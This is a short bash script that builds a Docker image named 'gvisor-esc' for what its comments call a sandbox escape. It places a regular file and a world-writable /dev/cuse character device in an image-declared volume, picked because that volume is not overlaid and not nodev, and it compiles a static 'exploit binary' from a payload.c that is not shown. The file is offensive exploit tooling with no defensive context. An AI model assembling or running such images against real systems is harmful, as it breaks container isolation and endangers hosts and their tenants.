#!/bin/bash
# Escape image builder.
#
# Produces image "gvisor-esc" containing:
#   /vol/A  regular file        (the raced, cached-as-REG name)
#   /vol/B  char device c 10 203 (/dev/cuse)
#   VOLUME /vol                (image-declared anonymous host volume:
#                               not overlaid, not nodev, directfs +
#                               cache=remote_revalidating)
#   /payload                   static exploit binary
#
# Usage: bash build.sh [image-tag]
#   (default: gvisor-esc)

set -eu

DIR="$(cd "$(dirname "$0")" && pwd)"
IMG="${1:-gvisor-esc}"
CC="${CC:-aarch64-linux-gnu-gcc}"
SUDO="${SUDO:-sudo}"

R="$(mktemp -d "$DIR/.build.XXXXXX")"
cleanup() { $SUDO rm -rf "$R" "$R.tar"; }
trap cleanup EXIT

mkdir -p "$R/vol"

printf 'REGULAR_REGULAR_REGULAR_0800' > "$R/vol/A"
$SUDO mknod "$R/vol/B" c 10 203
$SUDO chmod 666 "$R/vol/A" "$R/vol/B"
$SUDO chown -R 0:0 "$R"

# static exploit binary
$CC -static -O2 -Wall -o "$R/payload" "$DIR/payload.c" -lpthread
$SUDO chown 0:0 "$R/payload"
$SUDO chmod 755 "$R/payload"

$SUDO tar -C "$R" -cf "$R.tar" .
$SUDO docker import --change 'VOLUME /vol' "$R.tar" "$IMG" >/dev/null

echo "built $IMG from $R"
